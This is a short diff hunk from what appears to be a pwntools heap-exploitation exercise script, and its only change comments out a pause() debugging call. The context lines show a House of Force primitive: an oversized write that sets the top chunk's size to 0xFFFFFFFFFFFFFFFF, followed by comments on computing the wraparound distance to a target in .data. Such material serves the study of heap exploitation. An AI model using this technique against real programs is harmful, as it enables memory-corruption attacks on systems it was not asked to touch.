@@ -55,7 +55,7 @@ io.timeout = 0.1
 
 # Our House of Force primitive to overwrite the top chunk's size field.
 malloc(24, b"Y" * 24 + p64(0xFFFFFFFFFFFFFFFF))
-pause()  # Type `vis` and/or `top-chunk` in pwndbg to confirm the top chunk size
+# pause()  # Type `vis` and/or `top-chunk` in pwndbg to confirm the top chunk size
 
 # Calculate the distance wraparound to just before the `target` symbol in the
 # application's .data section. Note the .data section is *before* the heap:
